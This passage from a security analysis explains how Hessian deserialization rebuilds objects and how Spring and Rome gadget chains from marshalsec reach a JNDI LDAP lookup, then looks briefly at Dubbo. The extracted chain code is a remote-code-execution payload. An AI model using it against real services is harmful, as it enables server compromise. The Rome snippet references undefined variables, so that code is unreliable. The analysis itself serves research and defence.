                e.printStackTrace();
            }
            return data;
        }
        public static  T deserialize(byte[] data) {
            if (data == null) {
                return null;
            }
            Object result = null;
            try {
                ByteArrayInputStream is = new ByteArrayInputStream(data);
                HessianInput input = new HessianInput(is);
                result = input.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return (T) result;
        }
        public static void main(String[] args) {
            int id = 111;
            String name = "hessian";
            String gender = "boy";
            Map innerMap = new HashMap>();
            innerMap.put("1", ObjectInputStream.class);
            innerMap.put("2", SQLData.class);
            Student friend = new Student(222, "hessian1", "boy");
            List friends = new ArrayList();
            friends.add(friend);
            Student stu = new Student();
            stu.setId(id);
            stu.setName(name);
            stu.setGender(gender);
            stu.setInnerMap(innerMap);
            stu.setFriends(friends);
            System.out.println("---------------hessian serialize----------------");
            byte[] obj = serialize(stu);
            System.out.println(new String(obj));
            System.out.println("---------------hessian deserialize--------------");
            Student student = deserialize(obj);
            System.out.println(student);
        }
    }
The following is the general appearance of Hessian's processing during
deserialization drawn after debugging the above demo. (The picture is not
clear, you can click [this
link](https://www.processon.com/view/link/5c714c28e4b03334b5273bd6)):
The following details are explained by debugging to some key positions.
##### Get target type deserializer
First enter Hessian Input,read Object () to read the tag type identifier.
Since Hessian serializes the result into a Map, the first tag is always M
(ascii 77):
In the processing of `case 77`, the type to be deserialized is read, then
`this._serializerFactory.readMap (in, type)`is called for processing. By
default, Hessian standard used by _serializer Factory implements Serializer
Factory:
First get the corresponding Deserializer of this type, then call the
corresponding `Deserializer.readMap (in)` for processing, and see how to get
the corresponding Derserializer:
The first red box mainly determines whether a deserializer of this type is
cached in `_cacheTypeDeserializerMap`; the second red box mainly determines
whether a deserializer of this type is cached in`_staticTypeMap`,
`_staticTypeMap` mainly stores the basic type and the corresponding
deserializer; the third red box determines whether it is an array type, and if
so, enters the array type processing; the fourth obtains the Class
corresponding to the type, and enters `this .getDeserializer(Class)` gets the
Deserializer corresponding to this class, this example enters the fourth:
Here it again judged whether it is in the cache, but this time it used
`_cacheDeserializerMap`, whose type is `ConcurrentHashMap`, and before that it
was `_cacheTypeDeserializerMap`, and the type was `HashMap`. This may be to
solve the problem of obtaining in multithread . This example enters the second
`this.loadDeserializer(Class)`:
The first red box is to traverse the Serializer Factory set by the user and
try to get the Serializer corresponding to the type from each factory; the
second red box tries to get the Serializer corresponding to the type from the
context factory; the third red box Try to create a context factory and try to
get a custom deserializer of this type, and the deserializer corresponding to
this type needs to be similar to `xxxHessianDeserializer`, where `xxx`
indicates the class name of the type; the fourth red box is judged in turn, If
not match, then use `getDefaultDeserializer (Class),`. This example is the
fourth:
`_isEnableUnsafeSerializer` is true by default. The determination of this
value is first determined based on whether the the unsafe field of
`sun.misc.Unsafe` is empty, and the unsafe field of`sun.misc.Unsafe` is
initialized in the static code block by default and Not empty, so it is true;
then it will also be based on whether the system property
`com.caucho.hessian.unsafe` is false. If it is false, the value determined by
`sun.misc.Unsafe` is ignored, but the system property `com.
caucho.hessian.unsafe` is null by default, so it won't replace the result of
ture. Therefore, the value of `_isEnableUnsafeSerializer` is true by default,
so the above figure defaults to the UnsafeDeserializer used, and enters its
constructor.
##### Get deserializer of each attribute of target type
Here all the properties of the type are obtained and the corresponding
FieldDeserializer is determined. It is also determined whether there is a
ReadResolve () method in the class of the type. Let's first see how the type
property and FieldDeserializer determine:
Get the properties of this type and all parent classes, determine the FIeld
Deserializer of the corresponding properties in turn, and the properties
cannot be transient or static modified properties. The following is the Field
Deserializer that determines the corresponding properties in turn. Some Field
Deserializers are customized in Unsafe Deserializer.
##### Determine if the target type has a read Resolve() method defined
Then in the above Unsafe Deserializer constructor, it will also determine
whether there is a `readResolve()` method in a class of this type:
Iterate through all the methods in this class to determine if there is a
`readResolve()` method.
Okay, after that the acquired Deserializer are returned in the original way.
In this example, the class uses Unsafe Deserializer, and then returns to
`SerializerFactory.readMap (in, type)` and calls `UnsafeDeserializer.readMap
(in)`:
So far, the deserializer `UnsafeDeserializer` of
the`com.longofo.deserialize.Student` class in this example is obtained, and
the Field Serializer corresponding to each field is defined. At the same time,
the `readResolve()` method is defined in the Student class, so got the
`readResolve()` method of this class.
##### Assigning object to target type
Next, an object is assigned to the target type:
An instance of this class is allocated via `_unsafe.allocateInstance
(classType)`. This method is a native method in `sun.misc.Unsafe`. Assigning
an instance object to this class does not trigger a constructor call. The
attributes are now just given the JDK default values.
##### Recovery of target type object attribute values
The next step is to restore the attribute values of the target type object:
Into the loop, first call `in.readObject ()` to get the attribute name from
the input stream, then match the Field Deserizlizer corresponding to the
attribute from the previously determined `this._fieldMap`, and then call Field
Deserializer on the match to process. The serialized attributes in this
example are inner Map (Map type), name (String type), id (int type), and
friends (List type). Here we take the inner Map attribute recovery as an
example.
###### Take Inner Map attribute recovery as an example
The Field Deserializer corresponding to the inner Map is `UnsafeDeserializer$
ObjectFieldDeserializer`:
First call `in.readObject (fieldClassType)` to get the property value from the
input stream, and then call `_unsafe.putObject`, the native method
in`sun.misc.Unsafe`, and will not trigger the getter and setter methods.
Here's how to deal with `in.readObject (fieldClassType)`:
Here Map type uses Map Deserializer, correspondingly calling
`MapDeserializer.readMap (in)` method to restore a Map object:
Note the several judgments here. If it is a Map interface type, Hash Map is
used. If it is a Sorted Map type, Tree Map is used. Other Maps will call the
corresponding default constructor. In this example, because it is a Map
interface type, Hash Map is used. Next comes the classic scenario. First use
`in.readObject()` (this process is similar to the previous one and will not be
repeated). The map's key and value objects in the serialized data are
restored, and then call `map.put (key, value)`, here is Hash Map, the put
method of Hash Map will call `hash(key)` to trigger the `key.hashCode()`
method of key object, and put Val will be called in put method, and put Val
will Call the `key.equals (obj)` method of the key object. After processing
all keys and values, return to `UnsafeDeserializer$ObjectFieldDeserializer`:
Use the native method `_unsafe.putObject` to complete the inner Map property
assignment of the object.
#### Analysis of several Hessian gadget chains
In the marshalsec tool, there are several chains available for Hessian
deserialization:
  * Rome
  * X Bean
  * Resin
  * Spring Partially Comparable Advisor Holder
  * Spring Abstract Bean Factory Pointcu tAdvisor
Let‘s analyze two of them, Rome and Spring Partially Comparable Advisor
Holder. Rome is triggered by `HashMap.put`->`key.hashCode`, and Spring
Partially Comparable Advisor Holder is triggered by
`HashMap.put`->`key.equals`. Several others are similar, either using hash
Code or equals.
##### SpringPartiallyComparableAdvisorHolder
There are all corresponding Gadget Tests in marshalsec, which is very
convenient:
To make it clearer, I extracted `SpringPartiallyComparableAdvisorHolder`
gadget chain from marshalsec:
    String jndiUrl = "ldap://localhost:1389/obj";
    SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
    bf.setShareableResources(jndiUrl);
    //BeanFactoryAspectInstanceFactory.getOrder is called when deserializing，it Will trigger the call SimpleJndiBeanFactory.getType->SimpleJndiBeanFactory.doGetType->SimpleJndiBeanFactory.doGetSingleton->SimpleJndiBeanFactory.lookup->JndiTemplate.lookup
    Reflections.setFieldValue(bf, "logger", new NoOpLog());
    Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
    //AspectJAroundAdvice.getOrder is called when deserializing，it will trigger the call BeanFactoryAspectInstanceFactory.getOrder
    AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
    Reflections.setFieldValue(aif, "beanFactory", bf);
    Reflections.setFieldValue(aif, "name", jndiUrl);
    //AspectJPointcutAdvisor.getOrder is called when deserializing, it will trigger the call AspectJAroundAdvice.getOrder
    AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
    Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);
    //PartiallyComparableAdvisorHolder.toString is called when deserializing, it will trigger the call AspectJPointcutAdvisor.getOrder
    AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
    Reflections.setFieldValue(advisor, "advice", advice);
    //Xstring.equals is called when deserializing, it will trigger the call PartiallyComparableAdvisorHolder.toString
    Class pcahCl = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
    Object pcah = Reflections.createWithoutConstructor(pcahCl);
    Reflections.setFieldValue(pcah, "advisor", advisor);
    //HotSwappableTargetSource.equals is called when deserializing, it will trigger the call Xstring.equals
    HotSwappableTargetSource v1 = new HotSwappableTargetSource(pcah);
    HotSwappableTargetSource v2 = new HotSwappableTargetSource(Xstring("xxx"));
    //HashMap.putVal is called when deserializing, it will trigger the call HotSwappableTargetSource.equals. There is no direct use of the HashMap.put setting value. Direct put will trigger the utilization chain locally, so using marshalsec uses a more special processing method.
    HashMap s = new HashMap<>();
    Reflections.setFieldValue(s, "size", 2);
    Class nodeC;
    try {
        nodeC = Class.forName("java.util.HashMap$Node");
    }
    catch ( ClassNotFoundException e ) {
        nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);
    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
    Reflections.setFieldValue(s, "table", tbl);
Look at the following trigger process:
After `HessianInput.readObject()`, it comes to `MapDeserializer.readMap (in)`
to process Map type attributes, which triggers `HashMap.put (key, value)`:
`HashMap.put` has called the`HashMap.putVal` method, and the `key.equals(k)`
method will be triggered on the second put:
At this time, key and k are as follows, both are Hot Swappable Target Source
objects:
Enter `HotSwappableTargetSource.equals`:
In `HotSwappableTargetSource.equals`, the respective `target.equals` method is
triggered, that is, `XString.equals(PartiallyComparableAdvisorHolder)`:
`PartiallyComparableAdvisorHolder.toString` is triggered here:
Triggered `AspectJPointcutAdvisor.getOrder`:
触发了`AspectJAroundAdvice.getOrder`：
Here trigger `BeanFactoryAspectInstanceFactory.getOrder`:
This triggered
`SimpleJndiBeanFactory.getTYpe`->`SimpleJndiBeanFactory.doGetType`->
`SimpleJndiBeanFactory.doGetSingleton`->`SimpleJndiBeanFactory.lookup`->
`JndiTemplate.lookup`->`Context.lookup`:
##### Rome
Rome is relatively simple to trigger:
Like above, I extracted the gadget chain:
    //ToStringBean.toString() is called when deserializing，it will trigger the call JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup
    String jndiUrl = "ldap://localhost:1389/obj";
    JdbcRowSetImpl rs = new JdbcRowSetImpl();
    rs.setDataSourceName(jndiUrl);
    rs.setMatchColumn("foo");
    //EqualsBean.beanHashCode is called when deserializing, it will trigger the call ToStringBean.toString
    ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, obj);
    //HashMap.hash is called when deserializing, it will trigger the call EqualsBean.hashCode->EqualsBean.beanHashCode
    EqualsBean root = new EqualsBean(ToStringBean.class, item);
    //HashMap.put->HashMap.putVal->HashMap.hash
    HashMap s = new HashMap<>();
    Reflections.setFieldValue(s, "size", 2);
    Class nodeC;
    try {
        nodeC = Class.forName("java.util.HashMap$Node");
    }
    catch ( ClassNotFoundException e ) {
        nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);
    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
    Reflections.setFieldValue(s, "table", tbl);
Take a look at the trigger process:
Then called the hash method, which called the `key.hashCode` method:
Then `EqualsBean.hashCode`-> `EqualsBean.beanHashCode` is triggered:
Triggered `ToStringBean.toString`:
This calls `JdbcRowSetImpl.getDatabaseMetadata`, which
triggers`JdbcRowSetImpl.connect`-> `context.lookup`:
##### summary
As can be seen from the above two chains, when Hessian deserialization
basically uses deserialization to process the Map type, the call
`Map.put`->`Map.putVal`-> `key.hashCode` / `key.equals`-> ... will be
triggered, the subsequent series of starting processes are also related to
polymorphic characteristics. Some class attributes are of type Object, which
can be set to any class, and the hash Code and equals methods just call
Certain methods of properties carry out a subsequent series of triggers. So to
find such a gadget chain, we can directly find the classes with hash Code,
equals, and read Resolve methods, and then people judge and construct, but
this workload should be heavy; or use some chain mining tools, write rules to
scan as needed.
#### Simple analysis of Apache Dubbo deserialization
##### Apache Dubbo Http deserialization
Let's take a brief look at the HTTP problem mentioned earlier, and directly
use the official [samples](https://github.com/apache/dubbo-samples/tree/master/java), there is a dubbo-samples-http which can be used
directly, put a breakpoint directly in the `DemoServiceImpl.sayHello` method,
and deserialize the data in
`RemoteInvocationSerializingExporter.doReadRemoteInvocation`, using Java
Serialization:
Looking at the packet, the obvious `ac ed` flag:
##### Apache Dubbo Dubbo deserialization
Also use the official Dubbo-samples-basic, the default Dubbo hessian2
protocol, Dubbo has magically modified the hessian2, but the general structure
is still similar, in `MapDeserializer.readMap` is still similar to Hessian:
#### Reference
  1. 
  2. 
  3. 
  4. 
* * *